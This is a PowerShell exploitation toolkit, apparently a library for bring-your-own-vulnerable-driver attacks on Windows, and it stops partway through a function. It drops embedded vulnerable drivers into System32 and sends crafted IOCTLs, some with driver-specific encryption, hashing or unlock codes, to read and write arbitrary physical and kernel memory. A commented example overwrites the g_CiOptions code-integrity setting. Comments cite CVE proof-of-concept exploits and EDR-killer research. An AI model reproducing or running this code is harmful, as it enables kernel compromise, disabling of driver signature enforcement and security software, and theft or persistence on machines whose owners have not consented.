function Scan-DriverPrimitive {
    [CmdletBinding()]
    param (
        [Parameter(Mandatory = $false, Position = 0)]
        [string]$Path = 'C:\Program Files'
    )

    begin {
        # Using a HashSet provides O(1) lookups instead of sequential scanning via -contains
        $BYOVDPrimitives = [System.Collections.Generic.HashSet[string]]::new([string[]]@(
            # --- Virtual & Physical Memory Mapping ---
            "MmMapIoSpace", "MmMapIoSpaceEx", "MmMapIoSpaceSecure",
            "MmMapLockedPages", "MmMapLockedPagesSpecifyCache", "MmMapLockedPagesWithReservedMapping",
            "ZwMapViewOfSection", "NtMapViewOfSection", "MmMapUserAddressesToPageDirectory",
            "MmAllocateMappingAddress", "MmFreeMappingAddress",

            # --- Direct Memory Copy Primitives ---
            "MmCopyVirtualMemory", "MmCopyMemory",

            # --- Physical Address Resolution, Allocation & Object Resolution ---
            "MmGetPhysicalAddress", "MmGetVirtualForPhysical", "MmGetPhysicalMemoryRanges",
            "MmIsAddressValid", "MmAllocatePagesForMdlEx", "ObReferenceObjectByName", "IoGetDeviceObjectPointer",

            # --- Hardware Port & Register Access ---
            "READ_PORT_UCHAR", "READ_PORT_USHORT", "READ_PORT_ULONG",
            "WRITE_PORT_UCHAR", "WRITE_PORT_USHORT", "WRITE_PORT_ULONG",
            "READ_PORT_BUFFER_UCHAR", "READ_PORT_BUFFER_USHORT", "READ_PORT_BUFFER_ULONG",
            "WRITE_PORT_BUFFER_UCHAR", "WRITE_PORT_BUFFER_USHORT", "WRITE_PORT_BUFFER_ULONG",

            # --- Direct CPU Register Modification ---
            "__readmsr", "__writemsr", 
            "__readcr0", "__writecr0",
            "__readcr3", "__writecr3", 
            "__readcr4", "__writecr4",

            # --- Process/Thread Manipulation Primitives ---
            "ZwTerminateProcess", "NtTerminateProcess", "ZwOpenProcess", 
            "PsLookupProcessByProcessId", "ZwTerminateThread", "PsTerminateSystemThread"
        ), [System.StringComparer]::OrdinalIgnoreCase)
    }

    process {
        # Streaming via the pipeline prevents loading thousands of FileInfo objects into memory at once
        Get-ChildItem -Path $Path -Filter "*.sys" -Recurse -ErrorAction SilentlyContinue | ForEach-Object {
            $File = $_
            try {
                $Imports = Get-Imports -DllName $File.FullName -ErrorAction SilentlyContinue
                if ($null -eq $Imports) { return } # 'return' acts as 'continue' inside ForEach-Object

                foreach ($Match in $Imports) {
                    # Fast O(1) hash set lookup
                    if ($BYOVDPrimitives.Contains($Match.ImportedFunction)) {
                        [PSCustomObject]@{
                            DriverName      = $File.Name
                            DangerousImport = $Match.ImportedFunction
                            ImportedFrom    = $Match.SourceModule
                            FullPath        = $File.FullName
                        }
                    }
                }
            } catch {
                return
            }
        }
    }
}
function Format-HexView {
    [CmdletBinding(DefaultParameterSetName = "ByteArray")]
    param (
        # Parameter Set 1: Standard Byte Array Input
        [Parameter(Mandatory = $true, ValueFromPipeline = $true, ParameterSetName = "ByteArray")]
        [byte[]]$Data,

        # Parameter Set 2: Direct Unmanaged Pointer Input
        [Parameter(Mandatory = $true, Position = 0, ParameterSetName = "Pointer")]
        [IntPtr]$Address,

        [Parameter(Mandatory = $true, Position = 1, ParameterSetName = "Pointer")]
        [int]$Size,

        [ValidateSet("4x", "8x", "16x")]
        [string]$Mode = "8x"
    )

    begin {
        $fullBuffer = [System.Collections.Generic.List[byte]]::new()
        $Count = [int]($Mode.Replace("x", ""))
        
        if ($PsCmdlet.ParameterSetName -eq "Pointer") {
            if ($Address -eq [IntPtr]::Zero -or $Size -le 0) {
                Write-Error "Invalid memory pointer address or size requested."
                return
            }
            $tempArray = [byte[]]::new($Size)
            [System.Runtime.InteropServices.Marshal]::Copy($Address, $tempArray, 0, $Size)
            $fullBuffer.AddRange($tempArray)
        }
    }
    process {
        # Validated: Null check keeps 0x00 bytes intact through pipeline unrolling
        if ($PsCmdlet.ParameterSetName -eq "ByteArray" -and $null -ne $Data) {
            $fullBuffer.AddRange($Data)
        }
    }
    end {
        if ($fullBuffer.Count -eq 0) {
            Write-Warning "Hex view buffer is empty."
            return
        }

        Write-Host "--- Total: $($fullBuffer.Count) bytes | Alignment: $Mode ---" -ForegroundColor Cyan
        
        for ($i = 0; $i -lt $fullBuffer.Count; $i += $Count) {
            $remaining = [Math]::Min($Count, $fullBuffer.Count - $i)
            
            $hexElements = [string[]]::new($remaining)
            for ($j = 0; $j -lt $remaining; $j++) {
                $hexElements[$j] = "{0:X2}" -f $fullBuffer[$i + $j]
            }
            
            $hexPart = $hexElements -join " "
            "{0:X4} : {1}" -f $i, $hexPart
        }
    }
}
#endregion

$adminRequired = [Security.Principal.WindowsIdentity]::GetCurrent()
$adminRole = [Security.Principal.WindowsPrincipal]$adminRequired
if (-not $adminRole.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host "Error: This script must be run as Administrator."
    Read-Host
    exit 1
}

try {
    Import-Module NativeInteropLib -ErrorAction Stop
    Clear-Host
} catch {
    Install-NativeModule
    Import-Module NativeInteropLib -ErrorAction Stop
    Clear-Host
}

if (-not $NtApi) {
    $NtApi = Register-NativeMethods -FunctionList @(
        @{
            Name       = 'EnumDeviceDrivers'
            Dll        = 'kernelBase.dll'
            ReturnType = [Int32]
            Parameters = @(
                [IntPtr],
                [Int32]
                [Int32].MakeByRefType()
            )
        }, 
        @{
            Name       = 'NtCreateFile'
            Dll        = 'ntdll.dll'
            ReturnType = [Int32]
            Parameters = @(
                [IntPtr].MakeByRefType(), # FileHandle
                [Int32],                  # DesiredAccess
                [IntPtr],                 # ObjectAttributes
                [IntPtr],                 # IoStatusBlock
                [IntPtr],                 # AllocationSize
                [Int32],                  # FileAttributes
                [Int32],                  # ShareAccess
                [Int32],                  # CreateDisposition
                [Int32],                  # CreateOptions
                [IntPtr],                 # EaBuffer
                [Int32]                   # EaLength
            )
        },
        @{
            Name       = 'DeviceIoControl'
            Dll        = 'kernel32.dll'
            ReturnType = [Int32]
            Parameters = @(
                [IntPtr],   # hDevice
                [Int32],    # dwIoControlCode
                [IntPtr],   # lpInBuffer (Pointer to RTC64_MEMORY_READ)
                [Int32],    # nInBufferSize
                [IntPtr],   # lpOutBuffer (Pointer to RTC64_MEMORY_READ)
                [Int32],    # nOutBufferSize
                [IntPtr]    # lpBytesReturned
                [IntPtr]    # lpOverlapped
            )
        },
        @{
	        Name       = 'RtlQueryModuleInformation'
	        Dll        = 'ntdll.dll'
	        ReturnType = [Int32] # NTSTATUS
	        Parameters = @(
		        [Int32].MakeByRefType(), # BufferSize / InformationLength
		        [Int32],                 # UnitSize / SizePerModule (272)
		        [IntPtr]                 # Buffer / InformationBuffer
	        )
        }
    )
}
#region R/W
<#
$va = Get-gCiOptionsAddress

Invoke-MemoryOperation `
    -VA $va `
    -DriverName CmUpx `
    -Length 1024  | Format-HexView -Mode 16x

Invoke-MemoryOperation `
    -VA $va `
    -DriverName CmUpx `
    -AsInt

Invoke-MemoryOperation `
    -VA $va `
    -DriverName CmUpx `
    -Value 6 `
    -ValueType Int
#>

# CmUpx, AdvCare, pcdsrvc, AsrDrv
Function Invoke-MemoryOperation {
    [CmdletBinding(DefaultParameterSetName = 'Read')]
    param (
        [IntPtr]$VA = [IntPtr]::Zero,
        [Int64]$PA = 0L,

        [Parameter(Mandatory = $true)]
        [ValidateSet('CmUpx', 'AdvCare', 'pcdsrvc', 'AsrDrv')]
        [string]$DriverName,

        # --- WRITE MODES ---
        [Parameter(Mandatory = $true, ParameterSetName = 'WriteRaw')]
        [Byte[]]$Data,

        [Parameter(Mandatory = $true, ParameterSetName = 'WriteNumeric')]
        [Int64]$Value,

        [Parameter(Mandatory = $false, ParameterSetName = 'WriteNumeric')]
        [ValidateSet('Byte', 'Short', 'Int', 'Long')]
        [String]$ValueType = 'Int',
    
        # --- READ MODES ---
        [Parameter(Mandatory = $false, ParameterSetName = 'Read')]
        [Int32]$Length = 4,

        [Parameter(ParameterSetName = 'Read')] 
        [switch]$AsByte,
        [Parameter(ParameterSetName = 'Read')] 
        [switch]$AsShort,
        [Parameter(ParameterSetName = 'Read')] 
        [switch]$AsInt,
        [Parameter(ParameterSetName = 'Read')] 
        [switch]$AsLong
    )

    $PackDriverPackage = {
        [CmdletBinding()]
        param ([Parameter(Mandatory = $true)][uint32]$SubCommand, [byte[]]$RawData)

        # Prepare Inner Payload
        $InnerPayload = [byte[]]::new(8 + $RawData.Length)
        [BitConverter]::GetBytes($SubCommand).CopyTo($InnerPayload, 0)
        [Array]::Copy($RawData, 0, $InnerPayload, 8, $RawData.Length)

        # Compute buffer sizes
        $CiphertextLength = [int32]([Math]::Ceiling(($InnerPayload.Length + 1) / 16) * 16)
        $HeaderSize, $TrailerSize = 43, 6
        $retBuffer = [byte[]]::new($HeaderSize + $CiphertextLength + $TrailerSize)

        # Generate random material and populate metadata
        $Rng = [System.Security.Cryptography.RandomNumberGenerator]::Create()
        $IV = [byte[]]::new(16); $Rng.GetBytes($IV)
        $Entropy = [byte[]]::new(21); $Rng.GetBytes($Entropy)

        [BitConverter]::GetBytes(16).CopyTo($retBuffer, 2)
        [Array]::Copy($IV, 0, $retBuffer, 6, 16)
        [Array]::Copy($Entropy, 0, $retBuffer, 22, 21)

        # Key derivation & Mutation
        $KeyBytes = [System.Text.Encoding]::ASCII.GetBytes("C110DD4FE9434147B92A5A1E3FDBF29A")
        [Array]::Copy($retBuffer, 27, $KeyBytes, 13, 16)

        # Encrypt
        $Aes = [System.Security.Cryptography.Aes]::Create()
        $Aes.KeySize, $Aes.Mode, $Aes.Padding = 256, 'CBC', 'PKCS7'
        $Aes.Key, $Aes.IV = $KeyBytes, $IV
        try {
            $EncryptedData = $Aes.CreateEncryptor().TransformFinalBlock($InnerPayload, 0, $InnerPayload.Length)
        } finally {
            $Aes.Dispose()
        }

        # Assemble final buffer
        [Array]::Copy($EncryptedData, 0, $retBuffer, $HeaderSize, $EncryptedData.Length)
        [BitConverter]::GetBytes($EncryptedData.Length).CopyTo($retBuffer, ($retBuffer.Length - $TrailerSize))

        return $retBuffer
    }

    # 2. Translate VA -> PA
    if ($PA -eq 0L) {
        try {
            $hCorMem = Get-FileHandle -FileName CorMem
            if ($null -eq $hCorMem -or $hCorMem -eq 0) { 
                throw "Invalid handle." 
            }
            $TransInPtr = New-IntPtr -Size 8 -InitialValue $VA -UsePointerSize
            if (-not $NtApi::DeviceIoControl($hCorMem, 2236444, $TransInPtr, 8, $TransInPtr, 8, [IntPtr]::Zero, [IntPtr]::Zero)) { throw "Translation failed." }
            $PA = [Marshal]::ReadInt64($TransInPtr)
        } catch {
            # Do nothing
        }
        finally {
            Free-IntPtr $TransInPtr -Method Auto; 
            Free-IntPtr $hCorMem -Method NtHandle
        }
        if ($PA -eq 0) {
            try { $PA = Convert-VirtualToPhysical -VirtualAddress $VA } catch {}
        }
        if ($PA -eq 0) { 
            return Write-Error "Invalid physical address resolved."
        }
    }

    # 1. Determine Mode & Core Size Metrics
    $Mode = $PSCmdlet.ParameterSetName
    
    if ($DriverName -eq 'CmUpx') {
        if (-not [File]::Exists("C:\windows\system32\CmUpx.sys")) {
            Import-EmbeddedBlock -BlockName CmUpx -OutPath 'C:\windows\system32\CmUpx.sys' | Out-Null 
        }
    }
    if ($DriverName -eq 'AdvCare') {
        if (-not [File]::Exists("C:\windows\system32\AdvCare.sys")) {
            Import-EmbeddedBlock -BlockName AdvCare -OutPath 'C:\windows\system32\AdvCare.sys' | Out-Null 
        }
    }
    if ($DriverName -eq 'pcdsrvc') {
        if (-not [File]::Exists("C:\windows\system32\pcdsrvc_x64.sys")) {
            Import-EmbeddedBlock -BlockName pcdsrvc -OutPath 'C:\windows\system32\pcdsrvc_x64.sys' | Out-Null 
        }
    }
    if ($DriverName -eq 'AsrDrv') {
        if (-not [File]::Exists("C:\windows\system32\AsrDrv107.sys")) {
            Import-EmbeddedBlock -BlockName AsrDrv -OutPath 'C:\windows\system32\AsrDrv107.sys' | Out-Null 
        }
    }
    if ($Mode -like 'Write*') {
        if ($Mode -eq 'WriteRaw') {
            $PayloadBytes = $Data
        } else {
            switch ($ValueType) {
                'Byte'  { $PayloadBytes = [byte[]]@([byte]$Value) }
                'Short' { $PayloadBytes = [BitConverter]::GetBytes([Int16]$Value) }
                'Int'   { $PayloadBytes = [BitConverter]::GetBytes([Int32]$Value) }
                'Long'  { $PayloadBytes = [BitConverter]::GetBytes([Int64]$Value) }
            }
        }
        $PayloadSize = $PayloadBytes.Length
    } else {
        # Auto-adjust size if a specific type switch is set during a Read operation
        if ($AsByte)  { $Length = 1 }
        if ($AsShort) { $Length = 2 }
        if ($AsInt)   { $Length = 4 }
        if ($AsLong)  { $Length = 8 }
        $PayloadSize = $Length
    }

    # 2. Driver Configuration Mapping
    switch ($DriverName) {
        'AsrDrv' {
                
            $IOCTL      = 2288640
            $DeviceName = 'AsrDrv107'

            $IsWrite = $Mode -like 'Write*'

            if ($IsWrite) {
                $SubCommand     = 2287628
                $TargetLength   = $PayloadBytes.Length
                $WidthFlag      = if ($TargetLength % 4 -eq 0) { 2 } elseif ($TargetLength % 2 -eq 0) { 1 } else { 0 }
                $PayloadBuf     = New-IntPtr -Data $PayloadBytes
            } else {
                $SubCommand     = 2287624
                $TargetLength   = ($Length + 3) -band (-bnot 3)
                $WidthFlag      = 2
    
                # Allocate and zero out unmanaged buffer
                $PayloadBuf = New-IntPtr -Size $TargetLength
            }

            # Construct the shared 32-byte Request Structure
            $RequestStruct = New-Object byte[] 32
            [BitConverter]::GetBytes([UInt64]$PA).CopyTo($RequestStruct, 0)
            [BitConverter]::GetBytes([UInt32]$TargetLength).CopyTo($RequestStruct, 8)
            [BitConverter]::GetBytes([UInt32]$WidthFlag).CopyTo($RequestStruct, 12)
            [BitConverter]::GetBytes([UInt64]$PayloadBuf.ToInt64()).CopyTo($RequestStruct, 16)
    
            # Invoke packaging logic once
            $OuterBuffer = &$PackDriverPackage -SubCommand $SubCommand -RawData $RequestStruct

            $OutputSizeHint  = 4096
            $OutputBuffer    = New-Object byte[] $OutputSizeHint

            $Outbytes      = New-IntPtr -Size 4
            $InOutBuffer   = New-IntPtr -Data $OuterBuffer
            $OutBuffer     = New-IntPtr -Data $OutputBuffer
            $BufferSize    = $OuterBuffer.Length
            $OutBufferSize = $OutputBuffer.Length
        }
        'pcdsrvc' {
                
            $DeviceName = 'pcdsrvc_x64'

            $IsWrite = $Mode -like 'Write*'
            $IOCTL = if ($IsWrite) { 0x222088 } else { 0x222084 }

            # Setup Input Buffer
            if ($IsWrite) {
                $HeaderSize = 16 
                $RawSize    = $HeaderSize + $PayloadSize
                $BufferSize = ($RawSize + 3) -band -bnot 3 
            } else {
                $BufferSize = 16
            }

            $Buffer = [byte[]]::new($BufferSize)
            [BitConverter]::GetBytes([Int64]$PA).CopyTo($Buffer, 0)
            [BitConverter]::GetBytes([Int32]$PayloadSize).CopyTo($Buffer, 8)

            if ($IsWrite) {
                $PayloadBytes.CopyTo($Buffer, 13)
            }

            $InOutBuffer = New-IntPtr -Data $Buffer

            # Setup Output Buffer
            if ($IsWrite) {
                $OutBuffer     = [IntPtr]::Zero
                $OutBufferSize = 0
            } else {
                $OutBuffer     = New-IntPtr -Size $PayloadSize
                $OutBufferSize = $PayloadSize
            }
        }
        'CmUpx' {
            $IOCTL = if ($Mode -like 'Write*') { 2228312 } else { 2228316 }
            $DeviceName = 'CmUpx'
            $BufferSize = 0x18 + $PayloadSize
            
            $InOutBuffer   = New-IntPtr -Size $BufferSize
            $OutBuffer     = $InOutBuffer
            $OutBufferSize = $BufferSize
            
            [Marshal]::WriteInt32($InOutBuffer, 0x08, [Int32]$PA)
            [Marshal]::WriteInt32($InOutBuffer, 0x10, $PayloadSize)

            if ($Mode -like 'Write*') {
                $DestinationPointer = [IntPtr]([Int64]$InOutBuffer + 0x14)
                [Marshal]::Copy($PayloadBytes, 0, $DestinationPointer, $PayloadSize)
            }
        }
        'AdvCare' {
            $IOCTL = if ($Mode -like 'Write*') { -1673516976 } else { -1673516980 }
            $DeviceName = 'AdvCare'
            $BufferSize = 16
            
            $InOutBuffer   = New-IntPtr -Size 16
            $PayloadBuf    = New-IntPtr -Size $PayloadSize
            $OutBuffer     = $InOutBuffer
            $OutBufferSize = 16

            if ($Mode -like 'Write*') {
                [Marshal]::Copy($PayloadBytes, 0, $PayloadBuf, $PayloadSize)
            }

            [Marshal]::WriteInt32($InOutBuffer, 0x00, [Int32]$PA)
            [Marshal]::WriteInt32($InOutBuffer, 0x04, [Int32]$PayloadSize)
            [Marshal]::WriteInt64($InOutBuffer, 0x08, [Int64]$PayloadBuf)
        }
    }

    $RetBytes = New-IntPtr -Size 8

    try {
        # 3. Handle Management
        $hDevice = Get-FileHandle -FileName $DeviceName
        if ($null -eq $hDevice -or $hDevice -eq 0 -or $hDevice -eq -1) { 
            throw "Failed to open a handle to target driver instance: $DeviceName" 
        }

        if ($DriverName -eq 'pcdsrvc') {
            try {
                $UnlockBuf = New-IntPtr `
                    -Size 4 `
                    -InitialValue 0xA1B2C3D4
                if (-not $NtApi::DeviceIoControl(
                    $hDevice,    0x222004, 
                    $UnlockBuf,  4,
                    $UnlockBuf,  4, 
                    $RetBytes,     [IntPtr]::Zero 
                )) {
                    throw "Fail to Unlock Driver"
                }
            } finally {
                [marshal]::FreeHGlobal($UnlockBuf)
            }
        }

        # 4. Dispatch the Control Code Sequence
        $Result = $NtApi::DeviceIoControl(
            $hDevice,      $IOCTL, 
            $InOutBuffer,  $BufferSize,
            $OutBuffer,    $OutBufferSize, 
            $RetBytes,     [IntPtr]::Zero
        )

        if (-not $Result) {
            throw "DeviceIoControl call targeting $DeviceName failed."
        }

        # 5. Output Management
        if ($Mode -like 'Write*') {
            return $true
        } else {
            $ManagedBytes = New-Object Byte[] $PayloadSize

            if ($DriverName -eq 'CmUpx') {
                $SourcePointer = [IntPtr]([Int64]$InOutBuffer)
                [Marshal]::Copy($SourcePointer, $ManagedBytes, 0, $PayloadSize)
            } elseif ($DriverName -eq 'pcdsrvc') {
                $SourcePointer = [IntPtr]([Int64]$OutBuffer)
                [Marshal]::Copy($SourcePointer, $ManagedBytes, 0, $PayloadSize)
            } elseif ($DriverName -match 'AdvCare|AsrDrv') {
                [Marshal]::Copy($PayloadBuf, $ManagedBytes, 0, $PayloadSize)
            }

            # Return proper formatting
            switch ($true) {
                $AsByte  { return $ManagedBytes[0] }
                $AsShort { return [BitConverter]::ToInt16($ManagedBytes, 0) }
                $AsInt   { return [BitConverter]::ToInt32($ManagedBytes, 0) }
                $AsLong  { return [BitConverter]::ToInt64($ManagedBytes, 0) }
                default  { return $ManagedBytes }
            }
        }

    } catch {
        Write-Error $_
        return $false
    } finally {
        # 6. Resource Cleanup
        Free-IntPtr $RetBytes
        Free-IntPtr $InOutBuffer
        Free-IntPtr $PayloadBuf
        if ($DriverName -eq 'pcdsrvc') {
            Free-IntPtr $OutBuffer
        }
        Free-IntPtr $hDevice -Method NtHandle
    }
}
#endregion
#region Read
# RTcore
Function Read-Int8 {
    param(
        [IntPtr]$Address,
        [bool]$UseMap = $false
    )

    if ($UseMap) {
        
        initialize-RtCore
        $mr = [Activator]::CreateInstance([Type]'RTC64_MEMORY_READ')
        $mr.BaseAddress = $Address
        $mr.Size = 1
        $mr.Value = 0

        $structSize = [Marshal]::SizeOf($mr)
        $pMr = New-IntPtr -Object $mr

        $hHandle = Get-FileHandle -FileName 'RTCore64'
        $hr = $NtApi::DeviceIoControl(
            $hHandle,
            0x80002048,
            $pMr, $structSize,
            $pMr, $structSize,
            [IntPtr]::Zero, [IntPtr]::Zero)
        Free-IntPtr $hHandle -Method NtHandle

        $value = 0
        if ($hr -ne 0) {
            $value = [byte](([RTC64_MEMORY_READ]$pMr).Value -band 0xFF)
        }

        [Marshal]::FreeHGlobal($pMr)
        return $value
    }

    $value = Read-KernelMemory `
        -VA $Address `
        -AsByte
    return $value
}
Function Read-Int16 {
    param(
        [IntPtr]$Address,
        [bool]$UseMap = $false
    )

    if ($UseMap) {

        initialize-RtCore
        $mr = [Activator]::CreateInstance([Type]'RTC64_MEMORY_READ')
        $mr.BaseAddress = $Address
        $mr.Size = 2
        $mr.Value = 0

        $structSize = [Marshal]::SizeOf($mr)
        $pMr = New-IntPtr -Object $mr

        $hHandle = Get-FileHandle -FileName 'RTCore64'
        $hr = $NtApi::DeviceIoControl(
            $hHandle,
            0x80002048,
            $pMr, $structSize,
            $pMr, $structSize,
            [IntPtr]::Zero, [IntPtr]::Zero)
        Free-IntPtr $hHandle -Method NtHandle

        $value = 0
        if ($hr -ne 0) {
            $value = [Int16](([RTC64_MEMORY_READ]$pMr).Value -band 0xFFFF)
        }

        [Marshal]::FreeHGlobal($pMr)
        return $value
    }

    $value = Read-KernelMemory `
        -VA $Address `
        -AsShort
    return $value
}
Function Read-Int32 {
    param(
        [IntPtr]$Address,
        [bool]$UseMap = $false
    )

    if ($UseMap) {

        initialize-RtCore
        $mr = [Activator]::CreateInstance([Type]'RTC64_MEMORY_READ')
        $mr.BaseAddress = $Address
        $mr.Size = 4
        $mr.Value = 0

        $structSize = [Marshal]::SizeOf($mr)
        $pMr = New-IntPtr -Object $mr

        $hHandle = Get-FileHandle -FileName 'RTCore64'
        $hr = $NtApi::DeviceIoControl(
            $hHandle,
            0x80002048,
            $pMr, $structSize,
            $pMr, $structSize,
            [IntPtr]::Zero, [IntPtr]::Zero)
        Free-IntPtr $hHandle -Method NtHandle

        $value = 0
        if ($hr -ne 0) {
            $value = ([RTC64_MEMORY_READ]$pMr).Value
        }

        [Marshal]::FreeHGlobal($pMr)
        return $value
    }

    $value = Read-KernelMemory `
        -VA $Address `
        -AsInt
    return $value
}
Function Read-Int64 {
    param(
        [IntPtr]$Address,
        [bool]$UseMap = $false
    )

    if ($UseMap) {

        initialize-RtCore
        # Read the first 4 bytes (Low DWORD)
        $lowPart = Read-Int32 -Address $Address -UseMap $UseMap
        $lowPart = [Int64]($lowPart -band 0xFFFFFFFFL)

        # Read the next 4 bytes (High DWORD)
        $nextAddress = [IntPtr]($Address.ToInt64() + 4)
        $highPart = Read-Int32 -Address $nextAddress -UseMap $UseMap
        $highPart = [Int64]($highPart -band 0xFFFFFFFFL)

        # Shift high bytes and combine with low bytes
        $combinedValue = ($highPart -shl 32) -bor $lowPart
        return [Int64]$combinedValue
    }

    $value = Read-KernelMemory `
        -VA $Address `
        -AsLong
    return $value
}
Function Read-IntPtr {
    param(
        [IntPtr]$Address,
        [bool]$UseMap = $false
    )

    $value = Read-Int64 -Address $Address -UseMap $UseMap
    return [IntPtr]$value
}
# BiosToolCommonDriver, gibepext
function Read-KernelMemory {
    [CmdletBinding()]
    param (
        [IntPtr]$VA = [IntPtr]::Zero,
        [Int64]$PA = 0L,
        
        [ValidateRange(1, 4096)]
        [Int32]$Size = 4,

        [switch]$AsByte,
        [switch]$AsShort,
        [switch]$AsInt,
        [switch]$AsLong,

        [ValidateSet('BiosToolCommonDriver', 'gibepext')]
        [string]$Mode = 'BiosToolCommonDriver'
    )

    if ($AsByte)  { $Size = 1 }
    if ($AsShort) { $Size = 2 }
    if ($AsInt)   { $Size = 4 }
    if ($AsLong)  { $Size = 8 }

    if ($Mode -eq 'gibepext') {

        $DriverName    = "GibEpExt"        
        $DriverNameAlt = "GibEpFirmware"  
        $TransIoctl    = 2285604
        $MainIoctl     = 2285580

        if (-not [File]::Exists("C:\windows\system32\gibepext.sys")) {
            Import-EmbeddedBlock -BlockName gibepext -OutPath 'C:\windows\system32\gibepext.sys' | Out-Null
        }

    } else {

        $DriverName    = "BiosToolCommonDriver"
        $DriverNameAlt = "BiosToolCommonDriver"
        $TransIoctl    = 0x222034
        $MainIoctl     = 0x22202C

        if (-not [File]::Exists("C:\windows\system32\BiosToolCommonDriver.sys")) {
            Import-EmbeddedBlock -BlockName BiosToolCommonDriver -OutPath 'C:\windows\system32\BiosToolCommonDriver.sys' | Out-Null
        }
    }

    $hDevice = Get-FileHandle -FileName $DriverName -AlternativeName $DriverNameAlt
    if ($null -eq $hDevice -or $hDevice -eq 0) { 
        $hDevice = Get-FileHandle -FileName $DriverName -AlternativeName $DriverNameAlt -Symbolic 'Device'
        if ($null -eq $hDevice -or $hDevice -eq 0) { 
            return Write-Error "Invalid handle to $DriverName device."
        }
    }

    $MainInOut  = $null
    $ReadOutPtr = $null
    $BytesRet   = New-IntPtr -Size 8

    try {
        # STEP 1: TRANSLATE VIRTUAL ADDRESS TO PHYSICAL ADDRESS
        if ($PA -eq 0L) {
            if ($Mode -eq 'gibepext') {
                $buffer = New-Object byte[] 12
                [BitConverter]::GetBytes($VA.ToInt64()).CopyTo($buffer, 0)
            
                $crc = Get-KernelCustomHash ([byte[]]($buffer[0..7]))
                [BitConverter]::GetBytes([UInt32]$crc).CopyTo($buffer, 8)
                $MainInOut = New-IntPtr -Data $buffer
            
                if (-not $NtApi::DeviceIoControl($hDevice, $TransIoctl, $MainInOut, 12, $MainInOut, 12, $BytesRet, [IntPtr]::Zero)) {
                    $PA = Convert-VirtualToPhysical -VirtualAddress $VA
                } else {
                    $PA = [Marshal]::ReadInt64($MainInOut, 0)
                }
                if ($PA -eq 0) {
                    throw "Translation Fail." 
                }

            } else {

                $MainInOut = New-IntPtr -Size 16 -TypeSize ([IntPtr], [Int64]) -Values ($VA, 0L)
                if (-not $NtApi::DeviceIoControl($hDevice, $TransIoctl, $MainInOut, 16, $MainInOut, 16, $BytesRet, [IntPtr]::Zero)) { 
                    $PA = Convert-VirtualToPhysical -VirtualAddress $VA
                } else {
                    $Status = [Marshal]::ReadInt32($MainInOut, 0)
                    if ($Status -ne 0) { return Write-Error ("Translation failed with driver status: 0x{0:X}" -f $Status) }
                    $PA = [Marshal]::ReadInt64($MainInOut, 8)
                }
                if ($PA -eq 0) {
                    throw "Translation Fail." 
                }
            }
        }

        # STEP 2: EXECUTE PHYSICAL READ
        if ($Mode -eq 'gibepext') {
            $InputSize  = 16
            $OutputSize = $Size  
            
            $ByteBuffer = New-Object byte[] 16
            $HighPart   = [Int64](($PA -band 0xFFFFFFFF00000000) -shr 32)
            $LowPart    = [Int64]($PA -band 0x00000000FFFFFFFF)
            [BitConverter]::GetBytes($HighPart).CopyTo($ByteBuffer, 0)   
            [BitConverter]::GetBytes($LowPart).CopyTo($ByteBuffer, 4)    
            [BitConverter]::GetBytes([Int32]$OutputSize).CopyTo($ByteBuffer, 8) 
            
            $HashBuffer = New-Object byte[] 12
            [Buffer]::BlockCopy($ByteBuffer, 0, $HashBuffer, 0, 12)
            $CalculatedHash = Get-KernelCustomHash -Data $HashBuffer
            [BitConverter]::GetBytes([UInt32]$CalculatedHash).CopyTo($ByteBuffer, 12)

            $MainInOut  = New-IntPtr -Data $ByteBuffer
            $ReadOutPtr = [Marshal]::AllocHGlobal($OutputSize)

            if (-not $NtApi::DeviceIoControl($hDevice, $MainIoctl, $MainInOut, $InputSize, $ReadOutPtr, $OutputSize, $BytesRet, [IntPtr]::Zero)) {
                throw "Legacy physical read failed."
            }
            $DataPtr = $ReadOutPtr
        } else {
            $MainInOut = New-IntPtr -Size 4104 -TypeSize ([Int64], [Int32]) -Values ($PA, $Size)
            if (-not $NtApi::DeviceIoControl($hDevice, $MainIoctl, $MainInOut, 4104, $MainInOut, 4104, $BytesRet, [IntPtr]::Zero)) {
                throw "Legacy physical read failed."
            }
            $DataPtr = [IntPtr]($MainInOut.ToInt64() + 8)
        }

        # STEP 3: DATA MARSHALING
        if ($AsByte)  { return [Marshal]::ReadByte($DataPtr) }
        if ($AsShort) { return [Marshal]::ReadInt16($DataPtr) }
        if ($AsInt)   { return [Marshal]::ReadInt32($DataPtr) }
        if ($AsLong)  { return [Marshal]::ReadInt64($DataPtr) }

        $OutputByteArray = [byte[]]::new($Size)
        [Marshal]::Copy($DataPtr, $OutputByteArray, 0, $Size)
        return $OutputByteArray
    
    } finally {
        Free-IntPtr -handle $MainInOut
        Free-IntPtr -handle $ReadOutPtr
        Free-IntPtr -handle $BytesRet
        Free-IntPtr -handle $hDevice -Method NtHandle
    }
}
# ControlCenter, PORTWELL, HwRwDrv & CorMem [VA<>PA]
# MODAPI.sys (MSI Dragon Center) // http://github.com/rjt-gupta/CVE-2021-29337/blob/main/modapi_poc.c
# mydrivers64.sys (DriverGenius) // http://github.com/zeze-zeze/WindowsKernelVuln/blob/master/CVE-2023-1676/mydrivers64Exploit.cpp
# MegaDrov.sys                   // https://www.welivesecurity.com/en/eset-research/edr-killers-explained-beyond-the-drivers/
function Read-KernelAddress {
    param (
        [IntPtr]$VA = [IntPtr]::Zero,
        [Int64]$PA = 0L,

        [int]$Size = 4,
        [switch]$AsByte, 
        [switch]$AsShort, 
        [switch]$AsInt, 
        [switch]$AsLong,

        [ValidateSet("CC", "PW", "HW", "CI")]
        [String]$Mode = 'CC'
    )

    switch ($Mode) {
        'CC' {
            $Ioctl    = 0x9C406104
            $DevName  = 'ControlCenter'
            $AltName  = 'CCDRV1'
        }
        'PW' {
            $Ioctl    = -362781616  # Note: matches 0xEA646110 if cast to unsigned
            $DevName  = 'portwell'
            $AltName  = 'PORTWELL_0_1'
        }
        'CI' {
            $Ioctl    = 0x80102040
            $DevName  = 'CardIo64'
            $AltName  = 'CardIo'
        }
        'HW' {
            $Ioctl    = 0x9C406104
            $DevName  = 'HwRwDrv'
            $AltName  = 'HwRwDrv'
        }
    }

    # 1. Map explicit type switches to their strict sizes
    $TotalBytes = if ($AsByte) { 1 } elseif ($AsShort) { 2 } elseif ($AsInt) { 4 } elseif ($AsLong) { 8 } else { $Size }

    if (-not [File]::Exists("C:\windows\system32\CorMem.sys")) {
        Import-EmbeddedBlock -BlockName CorMem -OutPath 'C:\windows\system32\CorMem.sys' | Out-Null 
    }
    if (-not [File]::Exists("C:\windows\system32\ControlCenter.sys")) {
